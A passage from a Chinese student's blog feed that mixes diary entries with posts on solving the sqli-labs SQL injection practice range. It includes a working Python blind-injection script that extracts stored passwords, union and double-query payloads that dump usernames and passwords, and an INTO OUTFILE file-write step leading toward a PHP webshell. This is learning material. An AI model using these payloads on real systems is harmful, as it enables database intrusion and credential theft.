    <content type="html"><![CDATA[<p>永远不要失去从头再来的勇气。</p><span id="more"></span><p>今朝有酒今朝醉是我，</p><p>三更灯火五更鸡也是我。</p><p>消极时是无垠宇宙浸入了我，浩瀚而虚无。</p><p>积极时是晚秋的凉风吹拂了我，寒冷而清醒。</p><p>为啥是晚秋，因为今天是2021年10月20日，刚看了下24节气，再过几天是霜降。努力不需要过多的修饰，就是脚踏实地好好吃饭。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/1634742030776.jpeg"></p><p>—图源自电影《返老还童》</p><p>巧的是这也是我曾唯一给那个最喜欢的女孩子推荐过的电影。</p><p>这几天我也每晚呆在实验室（就目前那个“实验室”的作用就是一个自习室，叫实验室挺高端的），也熬夜玩手机到一点，期待RNG的世界赛取到好成绩（老皇杂了…这次世界赛可能是RNG和李哥的最后一年）在大学过了一年多了，也很是感谢我遇到的很多温柔且善良的人，我哥要结婚了希望他们能长长久久恩恩爱爱。。</p><p>这才叫碎碎念嘛，蛮对的起我起的分类名的。之前还担心有朋友会看，写的蛮拘束的。🤣实属多虑了。</p><p>我也不喜欢自怨自艾，但这么说出来一大推废话也轻松了许多，真正太负能量的还得靠自己强大，才能自己消化掉。</p><p>其实发这一篇主要就是想试试我还会发博客不，太久没发了。。</p><p>以后尽量常更新！记录自己的学习！</p><p>没事也可以发点废话检查一下自己的精神状态😁</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>不好笑</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>大一暑假的牢骚</title>
    <link href="/2021/07/26/%E5%A4%A7%E4%B8%80%E6%9A%91%E5%81%87%E7%9A%84%E7%89%A2%E9%AA%9A/"/>
    <url>/2021/07/26/%E5%A4%A7%E4%B8%80%E6%9A%91%E5%81%87%E7%9A%84%E7%89%A2%E9%AA%9A/</url>
    
    <content type="html"><![CDATA[<p>艹！怎么过了半个月了！</p><span id="more"></span><p>虽说早有预料到自己暑假恐怕又是无所事事混吃等死，可我这次，艹，势必不成功便成仁！</p><p>我写博客记录自己的学习经历，生活的趣事，是想用来督促我自己，让自己不要浪费生命，要活得精彩一些。</p><p>距离上次写技术文都好久了…长期一直在写的sqli labs的文章进度也保持稳定龟速…</p><p> 我也不喜欢写那些玩的事…玩是好玩，没必要写文章扯什么感悟折磨自己，而单纯的记录好傻哦，我怎么记嘛…不过玩的这几天，我也不后悔，以后还是得玩啊啊哈哈哈。</p><p>冲冲冲</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>不好笑</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>用python编写一个sql注入脚本</title>
    <link href="/2021/06/16/py_sql%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC/"/>
    <url>/2021/06/16/py_sql%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<p>现在我已经会print（”hello world”）了，下面让我们来试一下用python写一个sql注入的脚本吧！</p><p>（针对sqli-labs8~10关）</p><span id="more"></span><p>不久前做到sqli-labs第八关盲注，这关如果纯手工注入的话十分费时。所以先来学学怎么写个sql注入的自动化脚本。</p><p><em>首先感谢这位老哥的博客，给了我很多帮助[<a href="https://uuzdaisuki.com/"> <strong>Leticia’s Blog</strong> </a>]</em></p><hr><h4 id="sql盲注命令"><a href="#sql盲注命令" class="headerlink" title="sql盲注命令"></a>sql盲注命令</h4><p><em>以下关于命令的部分内容截取自</em></p><p><em><a href="https://www.w3school.com.cn/sql/sql_functions.asp">SQL 函数 (w3school.com.cn)</a></em></p><p><em><a href="https://my.oschina.net/zz006/blog/810112">sql中substr与substring函数用法 - 周大壮 - OSCHINA - 中文开源技术交流社区</a></em></p><ul><li><p>用来截取字符串的函数：</p><ul><li><strong><code>mid()</code></strong>    </li></ul><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> MID(<span class="hljs-built_in">column_name</span>,<span class="hljs-keyword">start</span>[,length]) <span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span><br></code></pre></div></td></tr></table></figure><table><thead><tr><th align="center">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">column_name</td><td align="left">必需。要提取字符的字段。</td></tr><tr><td align="center">start</td><td align="left">必需。规定开始位置（起始值是 1）。</td></tr><tr><td align="center">length</td><td align="left">可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td></tr></tbody></table><p>如：</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(database()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<br><span class="hljs-comment">//返回数据库第一位</span><br><span class="hljs-function"><span class="hljs-title">mid</span><span class="hljs-params">(database()</span></span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br><span class="hljs-comment">//返回数据库名的第一位并与a的ascii作比较。</span><br></code></pre></div></td></tr></table></figure><ul><li><strong><code>substr()</code>和<code>substring()</code></strong></li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">substr(<span class="hljs-keyword">string</span>,<span class="hljs-built_in">start</span>,<span class="hljs-built_in">length</span>)<br>substr(<span class="hljs-keyword">string</span>, <span class="hljs-built_in">start</span>, <span class="hljs-built_in">length</span>)<br></code></pre></div></td></tr></table></figure><p>string - 指定的要截取的字符串。<br>start - 必需，规定在字符串的何处开始。<br>正数 - 在字符串的指定位置开始<br>负数 - 在从字符串结尾的指定位置开始<br>0 - 在字符串中的第一个字符处开始<br>length - 指定要截取的字符串长度</p><p>可以看出用法同mid()类似</p><p>如：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">substr(database(),<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br>//返回数据库的第二位，然后与a的<span class="hljs-built_in">ascii</span>值比较<br>substr((SELECT table_name <span class="hljs-keyword">from</span> information_schema.tables where table_schema=text LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br>//查找test数据库的第一个表名并提取表名的第一位,然后与a的<span class="hljs-built_in">ascii</span>值作比较。<br></code></pre></div></td></tr></table></figure><ul><li><p><code>left()</code></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(string,n)</span></span><br></code></pre></div></td></tr></table></figure><p>string ： 必要参数，要截取的字符串。</p><p>n : 必要参数，规定截取的长度，从1开始。</p><p>如：</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">left</span><span class="hljs-params">(database()</span></span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;a&#x27;</span><br><span class="hljs-comment">//查看数据库名的第一位并和a的ascii作比较</span><br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>用来针对基于时间的盲注的函数：</p><ul><li><p><code>sleep()</code></p><figure class="highlight isbl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">sleep</span></span>(<span class="hljs-variable">seconds</span>)</span><br></code></pre></div></td></tr></table></figure><p>seconds ： 必要参数，延迟的秒数。</p><figure class="highlight lisp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lisp">if(<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;&#x27;a&#x27;,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>))#<br></code></pre></div></td></tr></table></figure><p>检测数据库的第一个字符的ascii值，再与a的ascii比较，如果浏览器直接显示，说明比a大，如果浏览器五秒后才显示，说明比a小</p></li></ul></li></ul><h4 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h4><ul><li><p>安装request库</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">pip install request<br><span class="hljs-regexp">//</span>win <span class="hljs-number">10</span>下 win+r 输入cmd 运行<br></code></pre></div></td></tr></table></figure></li><li><p>代码实现</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># author: eggs</span><br><br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment">#payload:</span><br><span class="hljs-comment"># select group_concat(schema_name) from information_schema.schemata</span><br><span class="hljs-comment"># select group_concat(table_name) from information_schema.tables where table_schema=&#x27;  &#x27;</span><br><span class="hljs-comment"># select group_concat(column_name) from information_schema.columns where table_schema=&#x27;  &#x27;and table_name=&#x27;  &#x27;</span><br><span class="hljs-comment"># select  1,2, group_concat(concat_ws(&#x27;~&#x27;,password,username)) from security.users %23</span><br>dic = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz,_ 0123456789()&#x27;</span><span class="hljs-comment">#基于这个字典循环爆破</span><br>string = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入要注入的网址(需包含注入点，并用and连接):&quot;</span>)<span class="hljs-comment">#https://.../?xx=...&#x27;and</span><br>model = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入脚本运行的模式:b~基于bool型的盲注。t~基于时间的盲注。&quot;</span>)<br><span class="hljs-keyword">if</span> model == <span class="hljs-string">&#x27;b&#x27;</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>            payload = <span class="hljs-string">&quot; substr((select group_concat(password) from security.users),&#123;0&#125;,1)=&#123;1&#125; %23&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(i),<span class="hljs-built_in">ascii</span>(j))<br>            response = requests.get(url+payload)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;You&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>                string += j<br>                <span class="hljs-built_in">print</span>(string)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(string)<br><span class="hljs-keyword">elif</span> model == <span class="hljs-string">&#x27;t&#x27;</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>            payload = <span class="hljs-string">&quot; if((substr((select group_concat(schema_name) from information_schema.schemata),&#123;0&#125;,1)=&#123;1&#125;),sleep(3),0) %23&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(i),<span class="hljs-built_in">ascii</span>(j))<br>            response = requests.get(url + payload)<br>            sec = response.elapsed.seconds<br>            <span class="hljs-keyword">if</span> sec &gt; <span class="hljs-number">2</span>:<br>                string += j<br>                <span class="hljs-built_in">print</span>(string)<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(string)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error!&quot;</span>)<br></code></pre></div></td></tr></table></figure></li></ul><p>贴一下运行结果,这是第8关的</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620213416.png"></p><p>9、10关更改一下payload即可</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210620224800.png"></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
      <tag>渗透</tag>
      
      <tag>py脚本</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我的博客满月了！</title>
    <link href="/2021/06/13/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%BB%A1%E6%9C%88%E4%BA%86%EF%BC%81/"/>
    <url>/2021/06/13/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%BB%A1%E6%9C%88%E4%BA%86%EF%BC%81/</url>
    
    <content type="html"><![CDATA[<p>我好厉害呀！</p><span id="more"></span><hr><p>当初为什么要搭建这个博客呢        </p><p>（这个博客也不能算我搭的…用的框架，甚至还没自己的服务器…）</p><p>是想着写下我的学习记录，督促自己去学习，甚至还能帮到别人    </p><p>（目前为止写的全是吹水水，别人的博客叫技术博客，我的博客叫QQ空间…）</p><p>目前为止嘛，我做的还行吧    </p><p>（四舍五入就是——我好厉害呀！）</p><hr><p>反正都是写给自己看的玩意，我就是想夸夸自己。</p><hr><p>不过为啥文章这么少呢…</p><p>最近其实学了好多东西，不过还有更多的地方没整明白，不好写技术文…</p><p>也经历了好多事，但忙着学技术也没心思写小作文发牢骚了…</p><hr><p>总结完了，投身祖国的建设比在这逼逼赖赖更重要！</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>不好笑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>blog</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>原来分开的日子，你数的这么清楚</title>
    <link href="/2021/06/04/%E5%8E%9F%E6%9D%A5%E5%88%86%E5%BC%80%E7%9A%84%E6%97%A5%E5%AD%90%EF%BC%8C%E4%BD%A0%E6%95%B0%E7%9A%84%E8%BF%99%E4%B9%88%E6%B8%85%E6%A5%9A/"/>
    <url>/2021/06/04/%E5%8E%9F%E6%9D%A5%E5%88%86%E5%BC%80%E7%9A%84%E6%97%A5%E5%AD%90%EF%BC%8C%E4%BD%A0%E6%95%B0%E7%9A%84%E8%BF%99%E4%B9%88%E6%B8%85%E6%A5%9A/</url>
    
    <content type="html"><![CDATA[<p>总在失去之后才学会怀念。</p><span id="more"></span><hr><p>从没想到分开后你会变得这么卑微，能一天天细数着以前的日子。</p><p>那的确是段快乐的时光，我只记得天地辽阔。</p><p>可你像是急着结束。不多一天，没有拖延。</p><p>可你又像是耐心陪伴。不少一天，不斩丝连。</p><p>没想到有天再见时，你打折了。</p><p>都不重要了，我早就找到了替代你的。</p><p>不瞒你说我甚至还找了俩，分别是小Q和小咪。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/deaa625e58edafa80b88abb0a1bb2f2e.jpg"></p><p>说的就是你，网易云</p><p>几块钱的事怎么这么能惦记啊，都快300天了</p><p>（今天打开网易云时的弹窗，有感而发，请对号入座）</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210604180917.png"></p><p><strong>主要你这个会员有啥用，会员到期了就听不了会员时下载的歌合理吗</strong></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/v2-a069e19b50660410b414101dc9a48d40_720w.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>好笑</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sql_ilabs闯关历程第一页（1~20）</title>
    <link href="/2021/05/19/sql-ilabs%E9%97%AF%E5%85%B3%E5%8E%86%E7%A8%8B01/"/>
    <url>/2021/05/19/sql-ilabs%E9%97%AF%E5%85%B3%E5%8E%86%E7%A8%8B01/</url>
    
    <content type="html"><![CDATA[<p>sqli_labs，一个印度老哥搭建的sql注入靶场，十分方便学习SQL注入，我将在本文记录我的闯关历程。</p><span id="more"></span><p>由于确实没啥基础，做这个题还是靠网上教程，争取总结到位，有自己的思考。靶场搭建过程略去。</p><hr><h3 id="sql注入常规流程"><a href="#sql注入常规流程" class="headerlink" title="sql注入常规流程"></a>sql注入常规流程</h3><p><em>先附上我在b站看到的一位up主总结的sql注入大体流程</em></p><ul><li><p>判断是否有注入</p><ul><li>可控参数的改变是否能够影响页面显示结果</li><li>输入的sql语句是否能报错——通过数据库的报错，能看到数据库的一些语句痕迹</li><li>输入的sql语句能否不报错——判断我们的语句是否能成功闭合</li></ul></li><li><p>判断是什么类型的注入</p></li><li><p><strong>语句是否能够被恶意修改</strong></p></li><li><p><strong>是否能够成功执行</strong></p></li><li><p>获取我们想要的数据</p><hr><p>在渗透测试中，information_schema库中有三个表对我们很重要。注意：<strong>mysql5.0以上才会有information_schema这个库</strong></p></li><li><p><strong>schemata</strong> 表 中 <strong>schema_name</strong> 字段存储数据库中<strong>所有的库名</strong></p></li></ul><ul><li><strong>tables</strong> 表 中<strong>table_schema</strong> 字段存储<strong>库名</strong> ，<strong>table_name</strong> 字段存储<strong>表名</strong></li></ul><p>    * <strong>columns</strong> 表 中 <strong>table_schema</strong> 字段存储<strong>库名</strong> ，<strong>table_name</strong> 字段存储<strong>表名</strong> ，<strong>column_name</strong> 字段存储<strong>字段名</strong></p><h2 id="通关历程"><a href="#通关历程" class="headerlink" title="通关历程"></a>通关历程</h2><h3 id="1-4"><a href="#1-4" class="headerlink" title="1~4"></a>1~4</h3><p> 完成最简单的sql注入。</p><ul><li><p>输入单双引号，观察报错信息，构造命令，配合<code>%23</code>或<code>--+</code>使语句闭合</p></li><li><p>使用 order by 语句判断字段数，接着union select 1,2,…观察能显示的数据</p></li><li><p>构造语句查询数据库的信息,以查询列password和username为例</p><figure class="highlight oxygene"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs oxygene">... <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata %<span class="hljs-number">23</span><br><br><span class="hljs-comment">//查询所有的数据库名,查到有“security”</span><br></code></pre></div></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> %<span class="hljs-number">23</span><br><br>//查询名为“<span class="hljs-keyword">security</span>”的数据库下所有的表名，查到有“users”<br></code></pre></div></td></tr></table></figure><figure class="highlight oxygene"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs oxygene">... <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> %<span class="hljs-number">23</span><br><br><span class="hljs-comment">//查询名为“users”的表下所有的字段名</span><br><span class="hljs-comment">//若不同库下有同名表下同名字段，则查询时where语句后加上 and table_schema=“security”</span><br></code></pre></div></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">... union <span class="hljs-keyword">select</span>  <span class="hljs-number">1</span>,<span class="hljs-number">2</span>, group_concat(concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-keyword">password</span>,username)) <span class="hljs-keyword">from</span> security.users %<span class="hljs-number">23</span><br><br>//查询数据库security中uers表的列<span class="hljs-keyword">password</span>和username的所有字段并用‘~’隔开<br></code></pre></div></td></tr></table></figure></li></ul><hr><h3 id="5-6"><a href="#5-6" class="headerlink" title="5~6"></a>5~6</h3><p> 输入的正常查询语句不再显示有用的信息，但报错语句仍有提示。此时根据题目类型“double injection”采用双查询注入的方法</p><blockquote><p><em>若SQL语句正确，则页面正常返回，但返回的页面中不包含任何有用的信息，而当SQL语句错误时，页面会显示SQL错误信息。在这种情况下，Double Injection是十分有用的。</em><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210529133753.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210529133753.png" alt="img"></a></p><p> <em>———查询有关double injection的详细信息请点击这里<a href="https://blog.werner.wiki/principle-of-double-injection-in-mysql/">Mysql中Double Injection原理浅析</a></em></p></blockquote><p>第一步完全一致，第二步不再用<code>select 1,2...</code>来观察回显，最多可用<code>order by</code>得到<code>union select</code> 的字段数。第三步中语句<code>union select...</code>后面拼接<code>concat((select...)</code>语句，两个select组成双查询。</p><ul><li><p>输入单双引号，观察报错信息，构造命令使语句闭合</p></li><li><p>使用 order by 语句判断字段数</p></li><li><p>构造语句查询数据库的信息<strong>（注意：group_concat函数在这里失效了，故没使用）</strong></p><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">...union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a %<span class="hljs-number">23</span><br><br>//查询当前数据库,得知当前数据库为‘security’，如要查别的数据库就<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">...union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a %<span class="hljs-number">23</span><br>//<span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> --&gt;limt <span class="hljs-number">1</span>,<span class="hljs-number">1</span> ...慢慢增加<span class="hljs-number">1</span>，直到<span class="hljs-keyword">limit</span> <span class="hljs-number">2</span>,<span class="hljs-number">1</span>查到我们需要的表名，如“users”<br></code></pre></div></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">...union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))<span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a %<span class="hljs-number">23</span><br>//同样<span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> --&gt;limt <span class="hljs-number">1</span>,<span class="hljs-number">1</span> ...慢慢增加<span class="hljs-number">1</span>知道查到列名username和<span class="hljs-keyword">password</span><br></code></pre></div></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs n1ql">...union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;~&#x27;</span>,username,<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">14</span>)*<span class="hljs-number">2</span>))a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a %<span class="hljs-number">23</span><br>//查询security.users下第一行的username和<span class="hljs-keyword">password</span>并用“~”隔开<br></code></pre></div></td></tr></table></figure></li></ul><hr><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p> 这里使mysql语句闭合的方式为<code>?id=1&#39;))...%23</code>比之前略微复杂,而且还没有具体的语法报错内容，只能多次尝试（这也太不友好了…<a href="https://blog.csdn.net/gou1791241251/article/details/111568910">点击查看这位老哥构造闭合语句的过程</a>）。同样页面不再显示有用的内容，只能看出语句是否正确，同5~6情况相似，最多可用<code>order by</code>得到<code>union select</code> 的字段数。但这关双注入的方式失效了，根据提示采用上传文件的方式。</p><p><strong>ps：途中我遇到了怎么也上传不了文件的情况， <a href="https://cloud.tencent.com/developer/article/1671259">这里</a>解释了原因，即需要先修改配置，赋予权限</strong>。可以看出这个漏洞的实现有较严格的条件限制。</p><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618162821.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210618162821.png" alt="img"></a></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">...union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> into outfile<span class="hljs-string">&quot;C://hello.txt&quot;</span><br><span class="hljs-regexp">//</span>注意路径用“<span class="hljs-regexp">//</span>”,该语句执行结果如下，新生成了一个写有内容的hello文件。<br></code></pre></div></td></tr></table></figure><p><a href="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210606235322.png"><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20210606235322.png" alt="img"></a></p><p>将<code>hello.txt</code>改成一句话木马的php文件,因为这里的服务器是用PHP 